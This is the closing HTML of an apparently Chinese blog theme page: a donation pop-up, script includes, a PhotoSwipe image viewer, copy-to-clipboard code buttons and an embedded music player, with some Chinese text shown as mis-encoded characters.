  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>è¯·æˆ‘å–æ¯å’–å•¡å§~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">æ”¯ä»˜å®</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">å¾®ä¿¡</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // sliderå±•å¼€çŠ¶æ€
                // todo: è¿™æ ·ä¸å¥½ï¼Œåé¢æ”¹æˆçŠ¶æ€
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // è·å¾—åŸå›¾å°ºå¯¸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // ç­‰å¾…ä¸¤ç§’é’Ÿåæ¢å¤
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // ç­‰å¾…ä¸¤ç§’é’Ÿåæ¢å¤
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    <div id="music">
    
    
    
    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
        src="//music.163.com/outchain/player?type=2&id=22707008&auto=0&height=32"></iframe>
</div>

<style>
    #music {
        position: fixed;
        right: 15px;
        bottom: 0;
        z-index: 998;
    }
</style>
    
    

  </div>
</body>

</html>